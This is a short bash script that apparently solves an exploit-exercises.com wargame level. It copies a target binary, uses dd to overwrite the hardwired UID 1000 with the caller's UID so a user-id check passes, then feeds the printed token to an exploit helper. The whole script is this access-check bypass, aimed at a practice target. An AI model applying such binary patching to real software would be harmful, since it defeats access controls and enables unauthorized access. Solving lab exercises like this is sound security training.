#!/bin/bash -eu
# Copyright (c) 2015, Heye Voecking <heye.voecking+exploit-exercises.com@gmail.com>

source $HOME/common/setup-exploit

int16ToHexString() {
  printf "%04x" $1 | awk -F '' '{print "\x" $3 $4 "\x" $1 $2}'
}

getHexStringOffsets() {
  grep --only-matching --byte-offset --binary --text --perl-regexp $1 |
    awk -F ':' '{print $1}'
}


BINARY=$(mktemp -u)
cp $TARGET_HOME/$TARGET $BINARY

registerTrap "rm $BINARY" EXIT

# Switch the hardwired UID 1000 with ours to trick the user id check
FIND_UID=1000
for OFFSET in $(<$BINARY getHexStringOffsets $(int16ToHexString $FIND_UID))
do
  printf $(int16ToHexString $(id -u)) |
    dd conv=notrunc of=$BINARY bs=1 seek=$(( $OFFSET )) 2>/dev/null
done

TOKEN=$($BINARY | awk '{print $4}')

exploit_with_token $TOKEN
